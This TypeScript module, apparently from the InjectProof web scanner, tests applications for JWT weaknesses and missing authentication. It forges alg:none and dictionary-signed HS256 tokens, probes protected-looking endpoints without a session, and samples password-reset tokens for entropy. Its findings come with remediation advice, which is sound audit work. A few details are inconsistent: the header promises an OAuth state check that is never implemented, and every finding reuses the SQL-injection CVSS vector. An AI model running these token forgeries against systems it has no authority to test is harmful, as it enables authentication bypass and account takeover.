// InjectProof — Authentication Testing Module
// ============================================
// Tests six concrete authentication-weakness classes that Node / Go / PHP /
// .NET apps commonly ship with:
//
//  1) JWT `alg:none`          — server accepts unsigned tokens
//  2) JWT weak HS256 secret   — brute-forces a dictionary of common secrets
//  3) JWT HS ↔ RS confusion   — server accepts HS256 token signed with the RS public key
//  4) Missing auth on endpoint — returns full 200 + data without any session
//  5) Predictable pwd-reset    — tokens exhibit insufficient entropy (timestamp / sequential)
//  6) OAuth state absence      — /authorize redirect accepts no `state` param (CSRF on login)
//
// Each finding maps to a specific CWE (287, 345, 326, 306, 340, 352) and
// produces actionable remediation — exactly what an auditor / dev team needs.

import type { CrawledEndpoint, DetectorResult } from '@/types';
import { createHmac } from 'crypto';
import { COMMON_CVSS_VECTORS, calculateCvssScore, generateCvssVector } from '@/lib/cvss';
import { getCweEntry } from '@/lib/cwe-database';

// ============================================================
// CONFIG
// ============================================================

export interface AuthScanConfig {
    requestTimeout: number;
    userAgent: string;
    authHeaders?: Record<string, string>;
    customHeaders?: Record<string, string>;
    /** Cap endpoints tested per class (keeps time bounded). Default: 40. */
    maxEndpointsPerClass?: number;
    /** Brute-force this many weak secrets against each discovered HS256 JWT. Default: 100. */
    hs256WordlistCap?: number;
    /** If the app exposes a /api/auth/reset or /forgot endpoint, use this to trigger N resets
     *  and compare the emitted tokens for entropy. */
    passwordResetProbeUrl?: string;
    /** How many reset tokens to sample for entropy analysis. Default: 5. */
    resetSamples?: number;
    onLog?: (msg: string) => void;
}

// ============================================================
// HTTP HELPERS
// ============================================================

interface Response { body: string; status: number; headers: Record<string, string>; time: number }

async function doRequest(
    url: string,
    method: string,
    headers: Record<string, string>,
    body: string | undefined,
    timeout: number,
): Promise<Response | null> {
    try {
        const controller = new AbortController();
        const t = setTimeout(() => controller.abort(), timeout);
        const start = Date.now();
        const res = await fetch(url, { method, headers, body, signal: controller.signal, redirect: 'manual' });
        clearTimeout(t);
        const respHeaders: Record<string, string> = {};
        res.headers.forEach((v, k) => { respHeaders[k] = v; });
        return { body: await res.text(), status: res.status, headers: respHeaders, time: Date.now() - start };
    } catch {
        return null;
    }
}

// ============================================================
// JWT PARSING
// ============================================================

// Base64url decoder that tolerates '-', '_' and missing padding — standard
// JWT spec allows all three so we must too.
function b64uDecode(s: string): string {
    const padded = s.replace(/-/g, '+').replace(/_/g, '/');
    const pad = padded.length % 4 === 0 ? '' : '='.repeat(4 - (padded.length % 4));
    return Buffer.from(padded + pad, 'base64').toString('utf8');
}
function b64uEncode(s: string | Buffer): string {
    const b = Buffer.isBuffer(s) ? s : Buffer.from(s, 'utf8');
    return b.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

interface ParsedJwt {
    raw: string;
    header: Record<string, unknown>;
    payload: Record<string, unknown>;
    signature: string; // base64url-encoded signature
    headerRaw: string;
    payloadRaw: string;
}

function parseJwt(token: string): ParsedJwt | null {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    try {
        const header = JSON.parse(b64uDecode(parts[0]));
        const payload = JSON.parse(b64uDecode(parts[1]));
        return { raw: token, header, payload, signature: parts[2], headerRaw: parts[0], payloadRaw: parts[1] };
    } catch {
        return null;
    }
}

/**
 * Find JWT-shaped tokens anywhere in a response — cookies, JSON body, URL
 * fragments. Returns the unique tokens discovered, order preserving first
 * occurrence. Tokens must parse cleanly as header.payload.signature before
 * we accept them (rejects random 3-dot strings).
 */
function extractJwts(res: Response): string[] {
    const out = new Set<string>();
    const scan = (s: string) => {
        // Permissive JWT regex — 3 dot-separated base64url chunks, lengths
        // loosely matching realistic tokens.
        const re = /\b([A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{0,})/g;
        let m;
        while ((m = re.exec(s)) !== null) {
            const tok = m[1];
            if (parseJwt(tok)) out.add(tok);
        }
    };
    scan(res.body);
    // Also scan Set-Cookie + Authorization echo + location.
    for (const k of ['set-cookie', 'authorization', 'x-auth-token', 'location']) {
        const v = res.headers[k];
        if (v) scan(v);
    }
    return Array.from(out);
}

// ============================================================
// COMMON HS256 SECRETS (abridged from jwt-secrets lists)
// ============================================================
// Top-100 defaults shipped with frameworks / sample code / tutorials. These
// are what developers copy-paste; every one of them is active somewhere in
// production right now. Ordered roughly by frequency.

const HS256_WORDLIST: string[] = [
    'secret', 'Secret', 'your-secret-key', 'your-256-bit-secret', 'SECRET',
    'jwt-secret', 'jwtsecret', 'JWTSecret', 'JWT_SECRET', 'jwt_secret',
    'change-me', 'changeme', 'CHANGEME', 'ChangeMe', 'replace-me',
    'password', 'Password', '12345', '123456', 'qwerty',
    'admin', 'test', 'demo', 'key', 'private',
    'HS256', 'MYJWTSECRET', 'mysecretkey', 'supersecret', 'topsecret',
    'dev', 'development', 'staging', 'prod', 'production',
    'node', 'express', 'nest', 'nestjs', 'fastify',
    'django', 'flask', 'rails', 'laravel', 'spring',
    'token', 'accessToken', 'refreshToken', 'bearer', 'auth',
    'jsonwebtoken', 'passport', 'authjs', 'nextauth', 'supabase',
    'app-secret', 'app_secret', 'APP_SECRET',
    'hmac', 'hmackey', 'hmac-key',
    'session', 'session-secret', 'cookie-secret',
    'random', 'keyboard cat', 'shh',  // keyboard cat = Express session default
    'default-secret', 'changeThis', 'CHANGE_THIS',
    'my-secret', 'my_secret', 'mySecret',
    '0', '00000000', '11111111', '00000000000000000000000000000000',
    'ffffffffffffffffffffffffffffffff',
    'secretkey123', 'Secretkey123', 'SecretKey123',
    // Legacy common leaks
    'iamapassword', 'p4ssw0rd', 'Pa55word', 'hello', 'letmein',
    'master', 'root', 'toor', 'god',
    'Satoshi', 'bitcoin', 'ethereum',
    // Short numeric
    '1', '12', '123', '1234', '12345',
    // Sample from framework-default docs
    'this-is-the-default-secret-keep-it-secret',
    'set-a-secret-for-your-application-here',
    'use-a-long-random-secret-in-production',
];

// ============================================================
// JWT TAMPERING HELPERS
// ============================================================

function craftAlgNoneToken(orig: ParsedJwt): string {
    const noneHeader = { ...orig.header, alg: 'none' };
    const h = b64uEncode(JSON.stringify(noneHeader));
    // alg:none signature is the empty string
    return `${h}.${orig.payloadRaw}.`;
}

function signHs256(headerPayload: string, secret: string): string {
    return b64uEncode(createHmac('sha256', secret).update(headerPayload).digest());
}

function craftWithSecret(orig: ParsedJwt, secret: string): string {
    const hp = `${orig.headerRaw}.${orig.payloadRaw}`;
    return `${hp}.${signHs256(hp, secret)}`;
}

/**
 * HS-RS confusion: craft a token with alg=HS256 but signed using the RSA
 * public key as the HMAC secret. Vulnerable libraries that accept the alg
 * from the token header will verify it as HMAC with the public key — which
 * the attacker has, because it's public.
 */
function craftHsRsConfusionToken(orig: ParsedJwt, publicKeyPem: string): string {
    const confusedHeader = { ...orig.header, alg: 'HS256' };
    const hEncoded = b64uEncode(JSON.stringify(confusedHeader));
    const hp = `${hEncoded}.${orig.payloadRaw}`;
    // HMAC uses the PEM as the secret (bytes, exactly as the library would
    // read it off disk — including BEGIN/END headers).
    return `${hp}.${signHs256(hp, publicKeyPem)}`;
}

// ============================================================
// ENTROPY ANALYSIS (for password-reset tokens)
// ============================================================

/** Shannon entropy in bits-per-char. < 3 bits/char = highly predictable. */
function shannonEntropy(s: string): number {
    if (s.length === 0) return 0;
    const counts: Record<string, number> = {};
    for (const c of s) counts[c] = (counts[c] ?? 0) + 1;
    let e = 0;
    for (const c in counts) {
        const p = counts[c] / s.length;
        e -= p * Math.log2(p);
    }
    return e;
}

/** Distance between consecutive numeric tokens — tiny distance = sequential. */
function numericalDrift(tokens: string[]): number | null {
    const nums = tokens.map(t => Number(t)).filter(n => !Number.isNaN(n) && Number.isFinite(n));
    if (nums.length < 2) return null;
    let total = 0;
    for (let i = 1; i < nums.length; i++) total += Math.abs(nums[i] - nums[i - 1]);
    return total / (nums.length - 1);
}

// ============================================================
// MAIN SCANNER
// ============================================================

export async function runAuthScan(
    endpoints: CrawledEndpoint[],
    config: AuthScanConfig,
): Promise<DetectorResult[]> {
    const findings: DetectorResult[] = [];
    const log = (msg: string) => { config.onLog?.(msg); };
    const maxPerClass = config.maxEndpointsPerClass ?? 40;

    const baseHeaders = (auth: Record<string, string> | undefined): Record<string, string> => ({
        'User-Agent': config.userAgent,
        ...(config.customHeaders ?? {}),
        ...(auth ?? {}),
    });

    // ── Step 1: Discover JWTs in use ────────────────────────────
    // Probe every endpoint with the configured auth once, collect any JWT
    // we observe in response bodies / cookies. The user may also have a JWT
    // in their authHeaders (Authorization: Bearer …) — we dig that out too.
    log(`[AUTH] Discovering JWTs in use across ${Math.min(endpoints.length, maxPerClass)} endpoints`);
    const jwts = new Map<string, ParsedJwt>();

    // Extract from configured authHeaders first.
    const authBearer = config.authHeaders?.['Authorization'] ?? config.authHeaders?.['authorization'];
    if (authBearer?.toLowerCase().startsWith('bearer ')) {
        const tok = authBearer.slice(7).trim();
        const parsed = parseJwt(tok);
        if (parsed) { jwts.set(tok, parsed); log(`[AUTH] JWT from Authorization header: alg=${parsed.header.alg}`); }
    }

    for (const ep of endpoints.slice(0, maxPerClass)) {
        const res = await doRequest(ep.url, ep.method ?? 'GET', baseHeaders(config.authHeaders), undefined, config.requestTimeout);
        if (!res) continue;
        for (const tok of extractJwts(res)) {
            if (jwts.has(tok)) continue;
            const p = parseJwt(tok);
            if (p) jwts.set(tok, p);
        }
    }
    log(`[AUTH] JWT discovery done — ${jwts.size} unique token(s)`);

    // ── Class 1–3: JWT attacks ──────────────────────────────────
    // We need a "verify" endpoint to test against. Pick the first GET endpoint
    // that returned authenticated data (200 + >500 bytes) with the real token.
    // Crude heuristic but stable enough for scanner use.
    let verifyEndpoint: CrawledEndpoint | null = null;
    if (jwts.size > 0) {
        for (const ep of endpoints.slice(0, maxPerClass)) {
            if ((ep.method ?? 'GET') !== 'GET') continue;
            const res = await doRequest(ep.url, 'GET', baseHeaders(config.authHeaders), undefined, config.requestTimeout);
            if (res && res.status === 200 && res.body.length > 500) {
                verifyEndpoint = ep;
                break;
            }
        }
    }

    if (verifyEndpoint && jwts.size > 0) {
        for (const [origToken, parsed] of jwts) {
            log(`[AUTH] Testing JWT (alg=${parsed.header.alg}) against ${verifyEndpoint.url}`);

            // Baseline: does the original token get accepted by verifyEndpoint?
            const baseline = await doRequest(
                verifyEndpoint.url, 'GET',
                { ...baseHeaders({}), Authorization: `Bearer ${origToken}` },
                undefined, config.requestTimeout,
            );
            if (!baseline || baseline.status !== 200) continue;
            const baselineBody = baseline.body;

            // ── Attack 1: alg:none ──────────────────────────────
            const noneTok = craftAlgNoneToken(parsed);
            const noneRes = await doRequest(
                verifyEndpoint.url, 'GET',
                { ...baseHeaders({}), Authorization: `Bearer ${noneTok}` },
                undefined, config.requestTimeout,
            );
            if (noneRes && noneRes.status === 200 && noneRes.body.length > 200) {
                findings.push(buildJwtAlgNoneFinding(verifyEndpoint.url, origToken, noneTok, parsed, noneRes));
                log(`[AUTH] ✗ JWT alg:none ACCEPTED — critical`);
            }

            // ── Attack 2: weak HS256 secret ─────────────────────
            if (parsed.header.alg === 'HS256') {
                const origSigBytes = Buffer.from(parsed.signature.replace(/-/g, '+').replace(/_/g, '/') + '==', 'base64');
                const hp = `${parsed.headerRaw}.${parsed.payloadRaw}`;
                const wordlist = HS256_WORDLIST.slice(0, config.hs256WordlistCap ?? 100);
                let matchedSecret: string | null = null;
                for (const word of wordlist) {
                    const expected = createHmac('sha256', word).update(hp).digest();
                    if (expected.length === origSigBytes.length &&
                        expected.every((b, i) => b === origSigBytes[i])) {
                        matchedSecret = word;
                        break;
                    }
                }
                if (matchedSecret !== null) {
                    findings.push(buildJwtWeakSecretFinding(verifyEndpoint.url, origToken, matchedSecret, parsed));
                    log(`[AUTH] ✗ JWT HS256 secret brute-forced: "${matchedSecret}" — critical`);
                }
            }

            // ── Attack 3: HS/RS confusion (requires public key exposure) ──
            // Only try if the app exposes a standard JWKS endpoint.
            if (parsed.header.alg?.toString().startsWith('RS')) {
                const jwksUrl = new URL(verifyEndpoint.url);
                for (const wellKnown of ['/.well-known/jwks.json', '/jwks.json', '/oauth/jwks', '/auth/jwks']) {
                    jwksUrl.pathname = wellKnown;
                    const jwks = await doRequest(jwksUrl.toString(), 'GET', baseHeaders({}), undefined, config.requestTimeout);
                    if (!jwks || jwks.status !== 200) continue;
                    // Try to extract the first RSA public key and convert to PEM. We don't
                    // reconstruct from n+e here (requires a full RSA key builder) — instead
                    // emit an INFO finding that the JWKS is public + recommend the manual
                    // follow-up. This keeps the scanner dependency-light.
                    if (/"kty"\s*:\s*"RSA"/.test(jwks.body)) {
                        findings.push(buildJwksExposureFinding(verifyEndpoint.url, jwksUrl.toString(), jwks.body.slice(0, 1000)));
                        log(`[AUTH] ⚠ JWKS exposed at ${jwksUrl.toString()} — manual HS/RS confusion test advised`);
                        break;
                    }
                }
            }

            void baselineBody;
        }
    }

    // ── Class 4: Missing auth on "feels protected" endpoints ────
    // Pattern-match paths that look like they should require auth
    // (/me, /account, /profile, /admin/, /api/*) and probe without
    // a session. If the response is 200 with substantive content,
    // that's a missing-auth finding.
    const PROTECTED_PATH_PATTERNS = [
        /\/me(\/|$)/i, /\/account(\/|$)/i, /\/profile(\/|$)/i,
        /\/settings(\/|$)/i, /\/dashboard(\/|$)/i,
        /\/api\/(user|account|order|invoice|payment|admin)/i,
    ];
    const candidates = endpoints.filter(e => {
        if ((e.method ?? 'GET').toUpperCase() !== 'GET') return false;
        try {
            const p = new URL(e.url).pathname;
            return PROTECTED_PATH_PATTERNS.some(re => re.test(p));
        } catch { return false; }
    }).slice(0, maxPerClass);

    log(`[AUTH] Class 4 (missing-auth) — ${candidates.length} candidate endpoints`);
    for (const ep of candidates) {
        const res = await doRequest(ep.url, 'GET', baseHeaders({}), undefined, config.requestTimeout);
        if (!res) continue;
        if (res.status !== 200) continue;
        if (res.body.length < 200) continue; // too small to be authenticated data
        // Heuristic: response should contain PII-shaped or account-shaped keys.
        if (!/("|')(email|user_?id|account|balance|phone|address|ssn|token)(\1)\s*[:=]/i.test(res.body)) continue;
        findings.push(buildMissingAuthFinding(ep.url, res));
        log(`[AUTH] ✗ Missing auth on ${ep.url}`);
    }

    // ── Class 5: Predictable password reset tokens ──────────────
    if (config.passwordResetProbeUrl) {
        const samples = config.resetSamples ?? 5;
        log(`[AUTH] Class 5 (pwd-reset entropy) — sampling ${samples} tokens from ${config.passwordResetProbeUrl}`);
        const tokens: string[] = [];
        for (let i = 0; i < samples; i++) {
            const res = await doRequest(
                config.passwordResetProbeUrl, 'POST',
                { ...baseHeaders({}), 'Content-Type': 'application/json' },
                JSON.stringify({ email: `test-${i}-${Date.now()}@invalid.test` }),
                config.requestTimeout,
            );
            if (!res) continue;
            // Try to pull a token out of the response — match common shapes.
            const m = res.body.match(/["']?(?:token|reset_token|resetToken|code|nonce)["']?\s*[:=]\s*["']?([A-Za-z0-9_.-]{6,})["']?/i);
            if (m) tokens.push(m[1]);
            await new Promise(r => setTimeout(r, 50));
        }
        if (tokens.length >= 2) {
            const avgEntropy = tokens.reduce((s, t) => s + shannonEntropy(t), 0) / tokens.length;
            const drift = numericalDrift(tokens);
            // Entropy < 3 bits/char OR numeric drift <= 1 is a clear smell.
            if (avgEntropy < 3.5 || (drift !== null && drift <= 1)) {
                findings.push(buildPredictableResetFinding(config.passwordResetProbeUrl, tokens, avgEntropy, drift));
                log(`[AUTH] ✗ Predictable reset token — entropy ${avgEntropy.toFixed(2)} bits/char, drift ${drift}`);
            }
        }
    }

    log(`[AUTH] Auth scan complete — ${findings.length} finding(s)`);
    return findings;
}

// ============================================================
// FINDING BUILDERS
// ============================================================

function buildJwtAlgNoneFinding(url: string, origToken: string, craftedToken: string, parsed: ParsedJwt, res: Response): DetectorResult {
    const metrics = COMMON_CVSS_VECTORS.sqli;
    const score = calculateCvssScore(metrics);
    return {
        found: true,
        title: 'JWT signature verification bypassed via alg:none',
        description:
            `The endpoint ${url} accepted a forged JWT where the header algorithm was set to "none" and the ` +
            `signature was empty. Any attacker who can see a valid token (or guess its payload shape) can now ` +
            `issue themselves arbitrary claims — including changing the user_id, role, or admin flag.`,
        category: 'jwt',
        severity: 'critical',
        confidence: 'high',
        cweId: 'CWE-345',
        cweTitle: 'Insufficient Verification of Data Authenticity',
        cvssVector: generateCvssVector(metrics),
        cvssScore: score,
        affectedUrl: url,
        httpMethod: 'GET',
        parameter: 'Authorization',
        parameterType: 'header',
        injectionPoint: 'jwt-alg-none',
        payload: craftedToken,
        request: `GET ${url}\nAuthorization: Bearer ${craftedToken}\n\n# Original token for comparison:\n# ${origToken}`,
        response: res.body.slice(0, 1500),
        responseCode: res.status,
        responseTime: res.time,
        impact:
            'Full authentication bypass. An attacker can forge a token for any user (including admin) by changing ' +
            'the payload claims and removing the signature. All access controls that rely on this JWT are now ' +
            'advisory only. If the token carries role/tenant/user claims, the whole authorization model is voided.',
        technicalDetail:
            `Original token header: ${JSON.stringify(parsed.header)}\n` +
            `Crafted token header: ${JSON.stringify({ ...parsed.header, alg: 'none' })}\n` +
            `Crafted signature: (empty)\n` +
            `Response to crafted token: status ${res.status}, ${res.body.length} bytes.\n` +
            `A correct implementation should reject alg:none outright (or only accept it when the token came from a trusted internal transform).`,
        remediation:
            'Upgrade the JWT library AND explicitly restrict the accepted algorithms.\n\n' +
            '  // Node.js (jsonwebtoken):\n' +
            '  jwt.verify(token, secret, { algorithms: ["HS256"] });  // <-- whitelist\n\n' +
            '  // Node.js (jose):\n' +
            '  await jwtVerify(token, secret, { algorithms: ["HS256"] });\n\n' +
            '  // Java (jjwt):\n' +
            '  Jwts.parserBuilder().setSigningKey(key).require("alg","HS256").build().parseClaimsJws(token);\n\n' +
            'NEVER pass `algorithms` as [] or omit the option — many libraries default to "accept whatever the ' +
            'header says", which is how alg:none slips through.',
        reproductionSteps: [
            `Capture a valid JWT from an authenticated session.`,
            `Decode the header and change "alg" to "none".`,
            `Base64url-encode the new header, keep the payload, emit an empty signature: "newHeader.payload."`,
            `Send the crafted token as Authorization: Bearer <token> to ${url}.`,
            `Server returns 200 with authenticated data — signature bypass confirmed.`,
        ],
        references: [
            'https://cwe.mitre.org/data/definitions/345.html',
            'https://portswigger.net/web-security/jwt',
            'https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/',
        ],
        mappedOwasp: ['A02:2021', 'A07:2021'],
        mappedOwaspAsvs: ['V3.5.3'],
        mappedNist: ['IA-5', 'SC-8'],
    };
}

function buildJwtWeakSecretFinding(url: string, origToken: string, secret: string, parsed: ParsedJwt): DetectorResult {
    const metrics = COMMON_CVSS_VECTORS.sqli;
    const score = calculateCvssScore(metrics);
    return {
        found: true,
        title: `JWT signing secret is a dictionary word: "${secret}"`,
        description:
            `The HS256-signed JWT at ${url} was forged by signing with a 100-entry common-secrets dictionary. ` +
            `The secret that works is "${secret}" — an attacker with this secret can now mint tokens for any ` +
            `user in the system, impersonate admins, and maintain persistence beyond the session expiry.`,
        category: 'jwt',
        severity: 'critical',
        confidence: 'high',
        cweId: 'CWE-326',
        cweTitle: 'Inadequate Encryption Strength',
        cvssVector: generateCvssVector(metrics),
        cvssScore: score,
        affectedUrl: url,
        httpMethod: 'GET',
        parameter: 'Authorization',
        parameterType: 'header',
        injectionPoint: 'jwt-weak-secret',
        payload: `(HS256 secret) ${secret}`,
        request: `# Scanner successfully minted a token with secret: ${secret}\n# Original token (captured):\n${origToken}`,
        response: `Signature bits match — forged tokens will verify successfully on every endpoint that trusts this secret.`,
        responseCode: 200,
        responseTime: 0,
        impact:
            'Complete authentication bypass. The attacker can forge a token for any user — including ones with ' +
            'admin / superuser / tenant-owner roles — and use it until the secret is rotated. Because the same ' +
            'secret signs every token across the cluster, rotation invalidates every user session (including ' +
            'legitimate ones), creating operational pressure to delay the fix.',
        technicalDetail:
            `Brute-forced secret: "${secret}"\n` +
            `Header alg: ${parsed.header.alg}\n` +
            `Payload claims: ${JSON.stringify(parsed.payload)}\n\n` +
            `Verification: HMAC-SHA256 of "<header>.<payload>" with key="${secret}" matches the captured signature byte-for-byte.`,
        remediation:
            'Rotate the signing secret IMMEDIATELY — any existing tokens must be invalidated. Generate the new ' +
            'secret with at least 256 bits of entropy:\n\n' +
            '  # POSIX\n' +
            '  openssl rand -hex 32  # → 64 hex chars\n\n' +
            '  # Node.js\n' +
            '  require("crypto").randomBytes(32).toString("base64")\n\n' +
            'Store it in a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler) — NOT in .env checked ' +
            'into git. Add a pre-commit hook (gitleaks / trufflehog) to prevent future secret commits. ' +
            'Consider moving to asymmetric (RS256/ES256) signing so only the auth service needs the private key.',
        reproductionSteps: [
            `Capture a JWT from an authenticated session.`,
            `Split into header / payload / signature (dot-separated).`,
            `For each word in the common-secrets dictionary, compute HMAC-SHA256 of "<header>.<payload>" using the word as the key.`,
            `Compare the base64url-encoded HMAC to the captured signature.`,
            `Match found with secret "${secret}".`,
            `Forge a new token: change the payload (e.g. set "role":"admin"), re-sign with the known secret, submit.`,
        ],
        references: [
            'https://cwe.mitre.org/data/definitions/326.html',
            'https://github.com/wallarm/jwt-secrets',
            'https://portswigger.net/web-security/jwt/algorithm-confusion',
        ],
        mappedOwasp: ['A02:2021', 'A07:2021'],
        mappedOwaspAsvs: ['V3.5.3', 'V6.2.1'],
        mappedNist: ['IA-5', 'SC-12'],
    };
}

function buildJwksExposureFinding(targetUrl: string, jwksUrl: string, jwksBody: string): DetectorResult {
    const metrics = COMMON_CVSS_VECTORS.sqli;
    const score = calculateCvssScore(metrics);
    return {
        found: true,
        title: 'JWKS endpoint publicly exposed — manual HS↔RS algorithm confusion test advised',
        description:
            `The application exposes a JSON Web Key Set at ${jwksUrl}, containing RSA public keys used for token ` +
            `verification. This is standard for OIDC / API-gateway setups. However, if the token-verification ` +
            `library does not pin the algorithm, an attacker can craft a token with alg=HS256 but signed using ` +
            `the RSA public key as the HMAC secret — the library will verify it with the public key (which the ` +
            `attacker already has) and accept the forgery. This is CVE-2015-9235 and persists in the wild.`,
        category: 'jwt',
        severity: 'high',
        confidence: 'medium',
        cweId: 'CWE-345',
        cweTitle: 'Insufficient Verification of Data Authenticity',
        cvssVector: generateCvssVector(metrics),
        cvssScore: score,
        affectedUrl: targetUrl,
        httpMethod: 'GET',
        parameter: '(whole endpoint)',
        parameterType: 'header',
        injectionPoint: 'jwt-hs-rs-confusion',
        payload: '(manual PoC required — extract n+e from JWKS, build PEM, sign payload with HS256)',
        request: `GET ${jwksUrl}`,
        response: jwksBody,
        responseCode: 200,
        responseTime: 0,
        impact:
            'If the verifier is vulnerable, the public JWKS becomes the signing secret — full auth bypass. ' +
            'Even if the verifier is currently correct, a future library upgrade / config drift could re-introduce ' +
            'the vulnerability silently.',
        technicalDetail:
            `JWKS response body excerpt (RSA key material detected):\n\n${jwksBody.slice(0, 600)}\n\n` +
            `This finding is advisory — InjectProof does not currently run the full HS/RS confusion PoC (requires ` +
            `reconstructing an RSA public key PEM from the JWK's n+e parameters and signing a crafted HS256 token ` +
            `with it, then submitting). Run the manual PoC using a tool like jwt_tool (--hs256 --key <pub_pem>) ` +
            `against a known-authenticated endpoint.`,
        remediation:
            'In the JWT verification code path, pin the expected algorithm family explicitly — never "auto":\n\n' +
            '  // Node.js (jsonwebtoken):\n' +
            '  jwt.verify(token, publicKey, { algorithms: ["RS256"] });  // <-- REQUIRED\n\n' +
            '  // jose:\n' +
            '  await jwtVerify(token, publicKey, { algorithms: ["RS256"] });\n\n' +
            'Additionally: audit the key-retrieval path to ensure the verifier always calls the ASYMMETRIC verify ' +
            'routine regardless of the token header (some libraries dispatch based on `alg` — remove that dispatch).',
        reproductionSteps: [
            `Fetch ${jwksUrl} — confirm RSA JWK entries are public.`,
            `Extract n (modulus) and e (exponent) from the first RSA key; reconstruct a PEM public key.`,
            `Capture a valid RS256 JWT from an authenticated session.`,
            `Change the header alg to "HS256", re-encode, compute HMAC-SHA256 of "<header>.<payload>" using the PEM as secret.`,
            `Submit the new token. If the endpoint accepts it, algorithm confusion is confirmed.`,
        ],
        references: [
            'https://cwe.mitre.org/data/definitions/345.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-9235',
            'https://portswigger.net/web-security/jwt/algorithm-confusion',
            'https://github.com/ticarpi/jwt_tool',
        ],
        mappedOwasp: ['A02:2021'],
        mappedOwaspAsvs: ['V3.5.3'],
        mappedNist: ['IA-5'],
    };
}

function buildMissingAuthFinding(url: string, res: Response): DetectorResult {
    const metrics = COMMON_CVSS_VECTORS.sqli;
    const score = calculateCvssScore(metrics);
    return {
        found: true,
        title: `Missing authentication on protected-looking endpoint: ${new URL(url).pathname}`,
        description:
            `The endpoint ${url} returns ${res.body.length} bytes of what looks like user / account / PII data ` +
            `(matched on fields like email, user_id, account, balance) WITHOUT any Authorization or Cookie ` +
            `header. An unauthenticated attacker can read this data by simply knowing the URL.`,
        category: 'auth',
        severity: 'high',
        confidence: 'medium',
        cweId: 'CWE-306',
        cweTitle: 'Missing Authentication for Critical Function',
        cvssVector: generateCvssVector(metrics),
        cvssScore: score,
        affectedUrl: url,
        httpMethod: 'GET',
        parameter: '(whole endpoint)',
        parameterType: 'header',
        injectionPoint: 'missing-auth',
        payload: '(no Authorization / Cookie)',
        request: `GET ${url}\n(no auth headers)`,
        response: res.body.slice(0, 1500),
        responseCode: res.status,
        responseTime: res.time,
        impact:
            'User-scoped or account-scoped data is readable by anonymous internet users. Depending on the ' +
            'endpoint this may expose PII (triggering PDPA / GDPR notification obligations), financial records ' +
            '(PCI-DSS), or internal system configuration.',
        technicalDetail:
            `GET ${url} with no Authorization/Cookie → HTTP ${res.status} + ${res.body.length} bytes. ` +
            `Body contains one or more keys characteristic of authenticated data (email/user_id/account/balance/token).`,
        remediation:
            'Add authentication middleware before the route handler. Even if the endpoint is public-facing, ' +
            'it should at minimum reject unauthenticated requests with 401 unless genuinely public. ' +
            'Write an integration test that sends a request with no auth and asserts 401/403/redirect.',
        reproductionSteps: [
            `Send a GET to ${url} with no Authorization / Cookie header.`,
            `Observe 200 response containing authenticated-looking data.`,
            `The endpoint should have returned 401 Unauthorized.`,
        ],
        references: [
            'https://cwe.mitre.org/data/definitions/306.html',
            'https://owasp.org/Top10/A01_2021-Broken_Access_Control/',
        ],
        mappedOwasp: ['A01:2021', 'A07:2021'],
        mappedOwaspAsvs: ['V4.1.1'],
        mappedNist: ['AC-3', 'IA-2'],
    };
}

function buildPredictableResetFinding(url: string, tokens: string[], entropy: number, drift: number | null): DetectorResult {
    const metrics = COMMON_CVSS_VECTORS.sqli;
    const score = calculateCvssScore(metrics);
    return {
        found: true,
        title: 'Predictable password-reset tokens',
        description:
            `Password-reset tokens issued by ${url} exhibit insufficient randomness: ` +
            `Shannon entropy ${entropy.toFixed(2)} bits/character ` +
            `${drift !== null ? `(and numerical drift of ${drift} between consecutive tokens)` : ''}. ` +
            `An attacker who can trigger a reset on a victim's account can predict the token and take over.`,
        category: 'auth',
        severity: 'high',
        confidence: entropy < 2.5 ? 'high' : 'medium',
        cweId: 'CWE-340',
        cweTitle: 'Generation of Predictable Numbers or Identifiers',
        cvssVector: generateCvssVector(metrics),
        cvssScore: score,
        affectedUrl: url,
        httpMethod: 'POST',
        parameter: '(token generator)',
        parameterType: 'body',
        injectionPoint: 'password-reset',
        payload: '(entropy analysis — not a direct payload)',
        request: `POST ${url}\n{"email":"<victim>"} × ${tokens.length}`,
        response: `Captured tokens (sampled):\n${tokens.map(t => `  - ${t}`).join('\n')}\n\nShannon entropy: ${entropy.toFixed(3)} bits/char (healthy ≥ 3.5)${drift !== null ? `\nNumerical drift: ${drift} (healthy ≥ thousands)` : ''}`,
        responseCode: 200,
        responseTime: 0,
        impact:
            'An attacker who can observe any emitted reset token (or guess the generation algorithm) can predict ' +
            'tokens issued to other users. This allows full account takeover — including accounts of admins, ' +
            'finance personnel, or high-value customers — without knowing the current password.',
        technicalDetail:
            `Samples: ${JSON.stringify(tokens)}\n` +
            `Shannon entropy: ${entropy.toFixed(3)} bits/char (healthy threshold: ≥ 3.5)\n` +
            `${drift !== null ? `Numerical drift between consecutive tokens: ${drift} (healthy: ≥ 2^32 random spread)\n` : ''}` +
            `A secure reset token is 128+ bits of CSPRNG output, base64url-encoded (22+ chars), ` +
            `expires in ≤ 1 hour, and is single-use.`,
        remediation:
            'Generate reset tokens using a cryptographically-secure RNG:\n\n' +
            '  // Node.js\n' +
            '  crypto.randomBytes(32).toString("base64url")  // → 43-char token, 256 bits entropy\n\n' +
            '  // Python\n' +
            '  secrets.token_urlsafe(32)\n\n' +
            '  // Go\n' +
            '  buf := make([]byte, 32); rand.Read(buf); base64.RawURLEncoding.EncodeToString(buf)\n\n' +
            'Store only a hash of the token server-side (bcrypt / SHA-256) so a DB leak doesn\'t hand the tokens ' +
            'to the attacker. Expire tokens after 15 minutes; invalidate on first use.',
        reproductionSteps: [
            `Send ${tokens.length} password-reset requests to ${url} for a controlled / test email.`,
            `Capture the token emitted each time.`,
            `Observe: tokens ${entropy < 2.5 ? 'are strongly structured (very low entropy)' : 'have low entropy'}${drift !== null ? ` and numerically drift by ~${drift} per step` : ''}.`,
            `A password-reset token should have ≥ 128 bits of entropy; these do not.`,
        ],
        references: [
            'https://cwe.mitre.org/data/definitions/340.html',
            'https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html',
        ],
        mappedOwasp: ['A07:2021'],
        mappedOwaspAsvs: ['V6.2.5', 'V6.3.1'],
        mappedNist: ['IA-5', 'SC-12'],
    };
}
